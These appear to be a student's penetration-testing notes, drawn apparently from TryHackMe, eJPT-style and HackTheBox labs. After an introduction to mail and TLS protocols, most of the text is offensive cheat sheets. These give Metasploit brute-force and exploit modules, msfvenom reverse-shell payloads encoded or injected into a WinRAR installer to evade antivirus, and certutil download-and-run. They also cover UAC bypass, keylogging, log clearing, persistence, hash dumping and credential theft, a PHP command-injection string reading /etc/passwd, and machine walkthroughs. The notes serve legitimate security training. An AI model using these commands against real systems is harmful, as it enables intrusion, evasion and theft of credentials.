In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.

Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.


-=-=-==
IMAP 
Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.

Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using LOGIN username password. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added c1, then c2, and so on. Then we listed our mail folders using LIST "" "*", before checking if we have any new messages in the inbox using EXAMINE INBOX. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.


-=-=-==-=-=-=-=-=-=-=-=-=-=-=

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

    Sniffing Attack (Network Packet Capture)
    Man-in-the-Middle (MITM) Attack
    Password Attack (Authentication Attack)
    Vulnerabilities

Attacking protocols and servers
From a security perspective, we always need to think about what we aim to protect; consider the security triad: Confidentiality, Integrity, and Availability (CIA). Confidentiality refers to keeping the contents of the communications accessible to the intended parties. Integrity is the idea of assuring any data sent is accurate, consistent, and complete when reaching its destination. Finally, availability refers to being able to access the service when we need it. Different parties will put varying emphasis on these three. For instance, confidentiality would be the highest priority for an intelligence agency. Online banking will put most emphasis on the integrity of transactions. Availability is of the highest importance for any platform making money by serving ads.

Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alternation, and Destruction (DAD)

-=-=-=
Sniffing attack
We would consider the following
    Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
    Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
    Tshark is a CLI alternative to Wireshark.

Consider a user checking his email messages using POP3. First, we are going to use Tcpdump to attempt to capture the username and password. In the terminal output below, we used the command sudo tcpdump port 110 -A. Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.

We need sudo as packet captures require root privileges. We wanted to limit the number of captured and displayed packets to those exchanged with the POP3 server. We know that POP3 uses port 110, so we filtered our packets using port 110. Finally, we wanted to display the contents of the captured packets in ASCII format, so we added -A


-=-=-==-
SSL/TLS

The protocols we have covered so far in this room are on the application layer. Consider the ISO/OSI model; we can add encryption to our protocols via the presentation layer. Consequently, data will be presented in an encrypted format (ciphertext) instead of its original form.

Protocol 	Default Port 	Secured Protocol 	Default Port with TLS
HTTP 	        80 	        HTTPS 	                443
FTP     	21      	FTPS            	990
SMTP     	25      	SMTPS            	465
POP3     	110      	POP3S            	995
IMAP     	143      	IMAPS            	993

Considering the case of HTTP. Initially, to retrieve a web page over HTTP, the web browser would need at least perform the following two steps:

    Establish a TCP connection with the remote web server
    Send HTTP requests to the web server, such as GET and POST requests.

HTTPS requires an additional step to encrypt the traffic. The new step takes place after establishing a TCP connection and before sending HTTP requests. This extra step can be inferred from the ISO/OSI model in the image presented earlier. Consequently, HTTPS requires at least the following three steps:

    Establish a TCP connection
    Establish SSL/TLS connection
    Send HTTP requests to the webserver

To establish an SSL/TLS connection, the client needs to perform the proper handshake with the server.


After establishing a TCP connection with the server, the client establishes an SSL/TLS connection, as shown in the figure above. The terms might look complicated depending on your knowledge of cryptography, but we can simplify the four steps as:

    The client sends a ClientHello to the server to indicate its capabilities, such as supported algorithms.
    The server responds with a ServerHello, indicating the selected connection parameters. The server provides its certificate if server authentication is required. The certificate is a digital file to identify itself; it is usually digitally signed by a third party. Moreover, it might send additional information necessary to generate the master key, in its ServerKeyExchange message, before sending the ServerHelloDone message to indicate that it is done with the negotiation.
    The client responds with a ClientKeyExchange, which contains additional information required to generate the master key. Furthermore, it switches to use encryption and informs the server using the ChangeCipherSpec message.
    The server switches to use encryption as well and informs the client in the ChangeCipherSpec message.

If this still sounds sophisticated, don’t worry; we only need the gist of it. A client was able to agree on a secret key with a server that has a public certificate. This secret key was securely generated so that a third party monitoring the channel wouldn’t be able to discover it. Further communication between the client and the server will be encrypted using the generated key.

Consequently, once an SSL/TLS handshake has been established, HTTP requests and exchanged data won’t be accessible to anyone watching the communication channel.

As a final note, for SSL/TLS to be effective, especially when browsing the web over HTTPS, we rely on public certificates signed by certificate authorities trusted by our systems. In other words, when we browse to TryHackMe over HTTPS, our browser expects the TryHackMe web server to provide a signed certificate from a trusted certificate authority, as per the example below. This way, our browser ensures that it is communicating with the correct server, and a MITM attack cannot occur.

we can see the following information:

    To whom is the certificate issued? That is the name of the company that will use this certificate.
    Who issued the certificate? This is the certificate authority that issued this certificate.
    Validity period. You don’t want to use a certificate that has expired, for instance.

Luckily, we don’t have to check the certificate manually for every site we visit; our web browser will do it for us. Our web browser will ensure that we are talking with the correct server and ensure that our communication is secure, thanks to the server’s certificate.


-=-=-==
SSH
To use SSH, you need an SSH server and an SSH client. The SSH server listens on port 22 by default. The SSH client can authenticate using:

    A username and a password
    A private and public key (after the SSH server is configured to recognize the corresponding public key)


--=-=
Summary 
Protocol 	TCP Port 	Application(s) 	                Data Security
FTP 	        21 	        File Transfer 	                Cleartext
FTPS 	        990 	        File Transfer 	                Encrypted
HTTP 	        80 	        Worldwide Web 	                Cleartext
HTTPS 	        443 	        Worldwide Web 	                Encrypted
IMAP 	        143 	        Email (MDA) 	                Cleartext
IMAPS 	        993 	        Email (MDA) 	                Encrypted
POP3 	        110 	        Email (MDA) 	                Cleartext
POP3S 	        995 	        Email (MDA) 	                Encrypted
SFTP 	        22 	        File Transfer 	                Encrypted
SSH 	        22 	        Remote Access and File Transfer Encrypted
SMTP 	        25 	        Email (MTA) 	                Cleartext
SMTPS 	        465 	        Email (MTA) 	                Encrypted
Telnet 	        23 	        Remote Access 	                Cleartext




Vulnerability	Description
Operating System
	These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based
	These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials
	Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
Application Logic
	These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor
	Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.

-=-=-=-=
'The Metasploit Framework'
  5.1 Overview
    MSF Architecture
      Interfaces: MSFconsole, MSFcli, Armitage & Web
      Modules: 
        exploit, 
        payload:
          > It is an advanced multi-functional paylaod that is executed in memory on the target system making it difficult to detect. It is not downloaded to the target system or is not executed on disk. As a result, no traces of the payload are left or are found on the target system
          Stageless (or Non-Staged payload): Payload that is sent to the taget system as is along with the exploit
          Staged payload : It is sent to the target in two parts whereby:
            Stagers: Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system
            Stage: Payload components that are downloaded by the stager

        encoder(For example, shikata_ga_nai is used to encode Windows payloads)
        NOPS(Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed)
        auxiliary
      Libraries: Rex, MSF Core & MSF Base
      
    MSF module locations
      MSF stores modules under the following directory
        /usr/share/metasploit-framework/modules
      User specified modules are stored here:
        ~/.ms5/modules

    Starting
      msfdb run
        db_status
   MSFconsole fundamentals
    version
    show -h
      show all // Show all modules
      show exploits 
    search portscan
      use auxiliary/scanner/portscan/tcp 
      (Once you have used it) back
    search -h
      search cve:2017 type:exploit platform:-windows
      search cve:2017 type:exploit platform:+windows
      search eternalblue
    sessions
    connect -h 
      connect 192.168.188.126 80

  Creating and managin workspaces
    workspace -h
      workspace
      hosts
      workspace -a Test
      workspace 
      workspace default
      workspace INE
      workspace -d Test //delete
      workspace -r INE PTA //rename

  Information Gathering & Enumeration
    Port scanning & enumeration with nmap
      nmap -Pn -sV -O 10.2.33.173 -oX windows_server_2012_results
      Importing nmap scan results into msf
        service postresql start
        msfconsole
          db_status
          workspace -a Win2k12
            db_import /root/windows_server_2012_results
            hosts
            services
            loot
            creds
          workspace -a Nmap_MSF
            db_nmap -Pn -sV -O 10.2.33.173 
            vulns
    Port scanning with auxiliary modules //Ideal for pivoting
      msfconsole
        search portscan
          use auxiliary/scanner/portscan/tcp
        //Once we have gained a meterpreter session
          meterpreter > run autoroute -s 192.112.57.2 //The IP on the other interface of the first target machine
        //BG this session and run portscan against the new target (192.112.57.3)
          Bash Script:
          #!/bin/bash
          for port in {1..1000}; do
          timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
          done)
      FTP enumeration
        search portscan
          use auxiliary/scanner/portscan/tcp
        search ftp type:auxiliary
          use auxiliary/scanner/ftp/ftp_version
            [Manually: nc -vn 192.19.87.3]
            searchsploit the version
          use auxiliary/scanner/ftp/ftp_login //brute force 
            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
            set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
          use auxiliary/scanner/ftp/anonymous
            
      SMB enumeration
        setg RHOSTS 192.91.46.3
        search type:auxiliary smb
        use auxiliary/scanner/smb/smb_version
        use auxiliary/scanner/smb/smb_enumshares
          set showfiles true
        use auxiliary/scanner/smb/smb_login
          set smbuser admin
          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 

      Web Server enumeration
        search type:auxiliary http
        use auxiliary/scanner/http/http_version
        use auxiliary/scanner/http/http_header
        use auxiliary/scanner/http/http_put
          set filename test.txt
          set filedad "Welcome"
        use auxiliary/scanner/http/http_login
        use auxiliary/scanner/http/robots_txt
        use auxiliary/scanner/http/dir_scanner
        use auxiliary/scanner/http/brute_dirs
        use auxiliary/scanner/http/dir_listing
        use auxiliary/scanner/http/files_dir
          set auth_uri /secure/ //The directory target
          unset userpass_file for not be equal to user_file
        use auxiliary/scanner/http/apache_userdir_enum

      MySQL enumeration
        search type:auxiliary mysql
        use auxiliary/scanner/mysql/mysql_version
        use auxiliary/scanner/mysql/mysql_login
          set username root
          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
        use auxiliary/scanner/mysql/mysql_enum
        use auxiliary/scanner/mysql/mysql_sql //To execute commands
        use auxiliary/scanner/mysql/mysql_file_enum
          set file_list /usr/share/metasploit-framework/data/wordlists/directory.txt
        use auxiliary/scanner/mysql/mysql_hashdump
        use auxiliary/scanner/mysql/mysql_schemadump
        use auxiliary/scanner/mysql/msyql_writable_dirs

      SSH enumeration
        workspace -a SSH_enum
        search type:auxiliary name:ssh
        use auxiliary/scanner/ssh
          ssh_version
          ssh_login //Password authentication
            set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
          ssh_login_pubkey //Key based authentication
          ssh_enumusers

      SMTP enumeration (SPF,DKIM & DMARC) => https://mxtoolbox.com/dmarc/details/what-is-a-dmarc-record
        search type:auxiliary name:smtp
        use auxiliary/scanner/stmp
          smtp_version
          smtp_enum
        manually
          ismtp
            ismtp -h 192.22.47.3 -e /mydic.txt
          sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
          swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
          smtp-user-enum
            smtp-user-enum -M VRFY -U footprinting-wordlist.txt -m 1 -D inlanefreight.htb -t 10.129.60.147 -t 10 -v

  Vulnerability scanning
    service postgresql start
    msfconsole -q
      db_status
      workspace -a MS3
      db_nmap -sS -sV -O 10.10.10.4
      hosts
      services
      search type:exploit name:Microsoft IIS
      
      analyze 
      vulns
    //If we would like to import Nessus results
        db_import /home/MS3_fkthix.nessus
        vulns -p445
        search cve:2017 name:smb or another different would be search cve:2012 name:rdp
    > You can use https://github.com/hahwul/metasploit-autopwn
      msfconsole -q
        load db_autopwn(Deprecated but it still works. Manual installation)
        db_autopwn -p -t -PI 445
    WMAP(web application vulnerability scanner)
      available as an MSF plugin and can be loadad directly in MSF
      load wmap
        wmap_sites -a 192.157.89.3
        wmap_targets -t http://192.157.89.3
        wmap_sites -l //Available sites
        wmap_targets -l //Available targets
        wmap_run -t //All the modules that will be used
        wmap_run -e //Run it
        wmap_vulns -l
      use auxiliary/scanner/http/options
      use auxiliary/scanner/http/http_put
        set PATH /data

  Client-side attacks
    Generating payloads with Msfvenom
      Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
      msfvenom --list payloads
      msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx86.exe
      msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx64.exe
      msfvenom --list formats //List valid executable formats 
      msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx86
      msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx64
        elf //Linux binary

        How to transfer this files?
          sudo python -m SimpleHttpServer 80
        
        We await from a connection back //Example
          msfconsole -q 
           set payload linux/x86/meterpreter/reverse_tcp
           use exploit/multi/handler 

    Encoding payloads with Msfvenom
      We can evade older signature based AV solutions by encoding our payloads.
      msfvenom --list encoders
        x86/shikata_ga_nai
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > encodedx86.exe
        //Pay attention with the iterations
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 x86/shikata_ga_nai -f elf > encodedx86Linux

    Injecting payloads into Windows portable executables //To avoid AV detection
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > winrar.exe
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > winrar-new.exe //To mantain the original functioning. It will not work all times
      msfconsole -q 
        use multi/handler
        //Once we have a session.
          sysinfo
          run post/windows/manage/migrate 
    Automating Metasploit with resource scripts
      ls -al /usr/share/metasploit-framework/scripts/resource      
      vim handler.rc
        use multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp 
        set LHOST 10.10.10.5
        set LPORT 4126
        run
      msfconsole -r handler.rc
      //Another
      vim portscan.rc
        use auxiliary/scanner/portscan/tcp
        set RHOSTS 10.10.10.7
        run
      msfconsole -r portscan.rc
      //Other
      vim db_status.rc
        db_status
        workspace 
        workspace -a Test
      //Upload it directly from msfconsole
      msfconsole -q
        resource ~/Documents/handler.rc //Load a resource script
        //Save last commands with makerc
          [msf](Jobs:0 Agents:0) exploit(multi/handler) >> makerc ~/Desktop/ajgs/
          [*] Saving last 4 commands to ~/Desktop/ajgs/ ...
    Exploitation
      Windows Exploitation
        Exploiting a vulnerable HTTP file server
          > You can't host a website on the HTTP file server (For example: Rejetto HFS ==> Free and open source)
          service postgresql start
          msfconsole -q
            db_status
            workspace -a HFS
            db_nmap -sS -sV -O 10.2.23.159
            search type:exploit name:rejetto
            use exploit/windows/http/rejetto_hfs_exec
            set payload //It is necessary because if you don't specify the payload it may assign an x86 instead an x64
        Exploiting Apache Tomcat
          It is a free and open source Java servlet web server
          It is used to build and host dynamic websites and web applications based on the Java software platform
          It utilizes the HTTP protocol to facilitate the underlying communication between the server and clients
          It runs on TCP port 8080 by default
          What's the difference between Apache and Apache Tomcat?
            > The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP
            > The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed by Java
          msfconsole -q
          //After using db_nmap
            services  //To check open ports
            search type:exploit tomcat_jsp
            use exploit/multi/http/tomcat_jstp_upload_bypass
              info
              set payload java/jsp_shell_bind_tcp
              set shell cmd
              //In another tab to migrate to a meterpreter shell
              msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=4126 -f exe > meterpreter.exe
              python3 -m http.server 80
              certutil -urlcache -f http://10.10.10.4/meterpreter.exe meterpreter.exe
            vim handler.rc
              use multi/handler 
              set PAYLOAD windows/meterpreter/reverse_tcp
              set LHOST 10.10.5.4
              set LPORT 4126
              run
            msfconsole -r handler.rc
  Linux Exploitation
    Exploiting a vulnerable FTP server
      vsftpd is the default FTP server for Ubuntu, CentOS and Fedora
      msfconsole -q 
      //Once we have gained access to change the normal shell to a meterpreter shell
        use post/multi/manage/shell_to_meterpreter
    Exploiting Samba
      msfconsole -q
        use exploit/linux/samba/is_known_pipename
          check
      //Once we have gained access to change the normal shell to a meterpreter shell
        use post/multi/manage/shell_to_meterpreter
          set LHOST eth1
    Exploiting a vulnerable SSH server
      libssh is a multiplataform C library implementing the SSHv2 protocol on client and server side
      use auxiliary/scanner/ssh/libssh_auth_bypass
        set spwan_pty true
          cat /etc/*release
    Exploiting SMTP
      Haraka is an open source high performance SMTP server developed in Node.js.
      > Haraka versions prior to 2.8.9 are vulnerable to command injection
      msfconsole -q
        use exploit/linux/smtp/haraka
        set SRVPORT 9898
        set email_to root@attackdefense.test 
        set payload linux/x64/meterpreter_reverse_http
        set LHOST eth1

  Post exploitation fundamentals
    Meterpreter fundamentals
      > The meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect
      > It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
      sessions -C sysinfo -i 1 //Run a meterpreter command on a session
      sessions -n xodanamewhateveryoulike -i 1
      meterpreter>
        lpwd //Check present working directory on local(attacker) machine
        lls //List the files present in current directory of the local machine
        lcd //Change directory on the local machine
        cat flag
        edit flag 
        download flag5.zip /root/Desktop 
        checksum md5 /bin/bash
        getenv PATH
        getenv TERM
        search 
        search -d /usr/bin -f *backdoor*
        search -f *.jpg
        search -f *.php
        download flag1
        shell
          /bin/bash -i
        ps
        migrate 580
        migrate -N apache2
        execute -f ifconfig
    Upgrading command shells to meterpreter shells
      Using shell_to_meterpreter 
        use shell_to_meterpreter
          set session 1
          set lhost eth1
          sessions -l
      Or upgrade a commmand shell with the '-u' parameter
        sessions -u 1
    Windows Post exploitation modules
      meterpreter > 
        screenshot
        getsystem //Privesc
        hashdump
        show_mount //Drives or mounts 
        ps
        migrate 2212 //explorer.exe
      search migrate 
        use post/windows/manage/migrate
      search win_privs
        use post/windows/gater/win_privs
          set session 1
      search enum_logged_on
        use post/windows/gather/enum_logged_on_users  //Current and recently logged users
      search checkvm //To know if the target is a virtual machine
        use post/windows/gather/checkvm
      search enum_applications //Enum installed applications
        post/windows/gather/enum_applications 
      //Access the data gathered
        loot
      search type:post platform:windows enum_av
        post/windows/gather/enum_av_excluded 
      post/windows/gather/enum_computers 
      post/windows/gather/enum_patches
      post/windows/gather/enum_shares
      post/windows/manage/enable_rdp
    Bypassing UAC
      getuid
      getprivs 
      shell
        net users
        net localgroup administrators 
      use exploit/windows/local/bypassuac_injection 
        set payload windows/x64/meterpreter/reverse_tcp
        set target Windows\ x64 //If x86 target is selected
    Token Impersonation with Incognito
      load incognito
        list_tokens -u //User tokens
        impersonate_token "ATTACKDEFENSE\Administrator"
        migrate 3544 //explorer.exe. Esto lo hago porque se han quedado los access tokens cacheados
        hashdump
    Establishing persistence on windows
      use exploit/windows/local/persistence_service 
        set service_name badservice
        set payload windows/meterpreter/reverse_tcp
      //Once we have done this, we will have persistence
      use exploit/multi/handler
    Enabling RDP
      use post/windows/manage/enable_rdp
        net user administrator hacker_123! //Change administrator password
    Windows keylogging
      meterpreter >
        migrate 2460 //explorer.exe
        keyscan_start
        kesycan_dump
        keyscan_stop
    Clearing Windows Event Logs
      meterpreter > 
        clearev
    Pivoting
      meterpreter > 
        ipconfig //Copy the other IP 
        run autoroute -s 10.2.27.0/20 //-s = subnet //Only applicable to msfconsole
      use auxiliary/scanner/portscan/tcp
        set rhosts [IP victim 2]
      meterpreter > 
        portfwd add -l 1234 -p 80 -r 10.2.27.187
      db_nmap -sS -sv -p 1234 localhost 
      use exploit/windows/http/badblue_passthru
        set payload windows/meterpreter/bind_tcp
  Linux post exploitation modules
    meterpreter > 
      sysinfo
      getuid
      shell
        cat /etc/passwd
        groups root
        cat /etc/*issue
        uname -r 
        uname -a
        netstat -antp
        ps aux
        env
      post/linux/gather/enum_configs //Several interesting files
      post/linux/gather/enum_network
      post/linux/gather/enum_protections
      post/linux/gather/enum_system
      post/linux/gather/checkcontainer
      post/linux/gather/checkvm
      post/linux/gather/enum_users_history //Maybe some users have typed passwords in clear text
      post/linux/gather/hashdump
      post/linux/gather/ecryptfs_creds
      post/linux/gather/enum_psk
      post/linux/gather/enum_xchat
      post/linux/gather/phpmyadmin_credsteal
      post/linux/gather/pptpd_chap_secrets
      post/linux/manage/donwload_exec
      post/linux/manage/sshkey_persistence
      post/multi/gather/env //Enviromental variables 
      post/multi/gather/ssh_creds
      post/multi/gather/docker_creds
      post/multi/manage/system_session
        set type python
        set handler true
      > notes //system protections saved to notes
      > loot //Display the information gathered by a post exploitation module
    Exploiting a vulnerable application
      chkrootkit -v 
      use exploit/unix/local/chkrootkit
        set chkrootkit /bin/chkrootkit //The PATH of chkrootkit
    Dumping hashes with Hashdump
      use post/linux/gather/hashdump
    Establishing persistence on Linux
      Manually
        useradd -m /www/var/html/ftp -s /bin/bash
        passwd ftp
        groups root
        usermod -aG root ftp
        groups ftp
        usermod -u 15 ftp //Modify user ID
      use exploit/linux/local/cron_persistence
      use exploit/linux/local/service_persistence
        set payload cmd/unix/reverse_python
      post/linux/manage/sshkey_persistence
        set createsshfolder true
Exploitation
  Vulnerability scanning overview
    Banner grabing
      banner.nse
      nc 192.168.113.3 22
      ssh root@192.168.113.3 22 //May give you some information
    With Nmap scripts
      nmap -sV -p 80 --script=http-waf-detect 192.168.113.3
      ❯ ls -la /usr/share/nmap/scripts | grep shellshock
        nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.168.113.3
  Searching for publicly available exploits
    + Exploit-db
    + Rapid7
    + Packet strom
    + searchsploit
        ls -la /usr/share/exploitdb
        searchsploit -u //Update exploitdb
        searchsploit -t java #Por titulo
        searchsploit -p 39166 #Copia al portapapeles
        searchsploit -m 39166 #Ademas copia al directorio actual 
        searchsploit -x 39166 #Examinar
        searchsploit -x --nmap resultado.xml
        searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
        searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
        searchsploit -c ProFTPD 1.3.5 #Case sensitive
        searchsploit remote windows smb -w | grep -e "EternalBlue" //Show the URL
        searchsploit remote linux ssh
  Fixing Exploits
    cp /usr/share/windows-resources/binaries/nc.exe
  Cross-compiling exploits
    Cross-compiling is the process of compiling code for a platfrom other than the one performing the compilation
    In Windows
      apt-get install mingw-w64 gcc
      searchsploit -m 9303
      i686-w64-mingw32-gcc 9303.c -o exploit
      i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
    In Linux
      searchsploit -m 40839
      gcc -pthread 40839 -o exploit -lcrypt
    We could use the precompiled binaries from exploitdb
      https://gitlab.com/exploit-database/exploitdb-bin-sploits

-=-=-=-
CMS 
#Joomla
In /administrator/manifests/files/joomla.xml you could access a list of files inside the root folder, and version of Joomla.
In /language/en-GB/en-GB.xml you can get the version of Joomla.
->Scripts 
  https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
  https://github.com/OWASP/joomscan
-=-=
#Wordpress 

Under Appearance Editor 
  system shellexec exec passthru

#Automated
wpscan --url <> -o results_wpscan
wpscan --url <> -e vp,u #Enumerate vulnerable plugins and users

If we get a valid user 
wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --max-threads 50
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
Digital Forensics

pdfinfo #Shows various metadata related
-=-=
Photo EXIF Data

EXIF stands for Exchangeable Image File Format; it is a standard for saving metadata to image files. Whenever you take a photo with your smartphone or with your digital camera, plenty of information gets embedded in the image. The following are examples of metadata that can be found in the original digital images:

    Camera model / Smartphone model
    Date and time of image capture
    Photo settings such as focal length, aperture, shutter speed, and ISO settings

Because smartphones are equipped with a GPS sensor, finding GPS coordinates embedded in the image is highly probable. The GPS coordinates, i.e., latitude and longitude, would generally show the place where the photo was taken.

exiftool image.jp

steghide embed -ef '/root/secret.txt' -cf '/root/FatBird.jpg' -p password123
steghide extract -sf '/root/FatBird.jpg' -p password123 -xf '/root/secret.txt

display file.wav
play file.wav
-=-=-=-=-
MITRE

-=-=-=-=-=-=
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
Over the wire 
--> Bandit 
cat bandit0 == echo `cat bandit0` #It will replace the content
cat - # Refers to stdin
strings ./* or file ./*
find inhere/ -readable -size 1033c ! -perm /111 2>/dev/null
find / -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/
dev/null

gunzip 
bzip2 -> bunzip2
tar ---> tar xf 


cat /etc/bandit_pass/bandit14 | nc localhost 30000
curl -s -X GET localhost:30000 -u bandit14

ctrl u 
ctrl k 
ctrl d 
alt backspace 

-=-=-=-=
GIT 
git branch -a
git checkout [nameofthebranch]
git log "commit" | cut -d " " -f 2 | while read line; do git show $line;done| less
git grep password
git reflog
  What is difference between git log and Reflog?
  The biggest difference between Git reflog vs. log is that the log is a public accounting of the repository's commit history while the reflog is a private, workspace-specific accounting of the repo's local commits

git add key.txt
git commit
git push
#First example of doing git commits
jekyll serve
git add .
git commit -m "My first blog"
git push -u origin

git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
git status 
git add . 
git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
git push 

$0 
-=-=-=-=-
python 
#-*- coding: utf-8 -*-

-=-=-=--=
Testing things
Example on search page with PHP
  a /dev/null; cat /etc/passwd #
  . /etc/passwd #
-=-=-=-=-
Java 
gunzip a jar 
strings or javap -c <file>

-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==
Machines
#Windows
$Silo
crapmapexec smb 10.129.95.188
smbclient -L 10.129.95.188 -N 
downloading odat github ==> after installing ==> sqlplus64 to test ==> python3 odat.py --help ==> ❯ python3 odat.py sidguesser -s 10.129.95.188 #to know valid sids ==> Use this dictionary /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt but change format to 'username/password'==> ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f exe -o malito.exe ==> ❯ python3 odat.py utlfile -s 10.129.95.188  -d XE -U 'scott' -P 'tiger' --putFile /Temp badcat.exe payload/malito.exe --sysdba ==> Exec this file and nc. ==> NT/authority system
-=-=-=-=-=-=
Lame
smbclient to list shares #If we have this problem we could use --option="client min protocol=NT1"   ❯ smbclient -L 10.129.122.21 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED==> ❯ smbclient -L //10.129.122.21 --option="client min protocol=NT1" #connect to tmp ==> ❯ smbclient -L \\10.129.122.21\tmp -N --option="client min protocol=NT1" -c "dir" ==> Search for an exploit to authenticate ==> We could use find ==> find / -type f \( -name "user.txt" -o -name "root.txt" \) | xargs cat
-=-=-=-=-=-=
Forest
dig axfr  @10.10.10.161 htb.local ==> Initial enumeration with rpc client ==> enumdomusers, enumdomgroups, querygroup 0x200 , querygroupmem 0x200, queryuser 0xf14 crackmapexec smb 10.129.69.58 ==> rpcclient -U "" 10.129.69.58 -N -c "enumdomusers" #Check if you can get a TGT (dont require pre auth) ==> ❯ rpcclient -U "" 10.129.69.58 -N  -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > ../content/users.txt ==>  impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt ==> Check if credentials are valid with ❯ crackmapexec smb 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' #If we have a + the creds are valid. If Pwned we could connect with PSexec to an interactive shell ==> Check if you can get a TGS with ❯ GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.129.69.58 -dc-ip 10.129.69.58 2>/dev/null ==> ❯ sudo ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.69.58 #If not valid credentials try this. service apache2 start and in browser localhost/ ==> If there is nothing interest, check again credentials with ❯ crackmapexec winrm 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' #If Pwn3d!  get evil-winrm with ❯ gem install evil-winrm ==> ❯ evil-winrm -i 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' ==> 
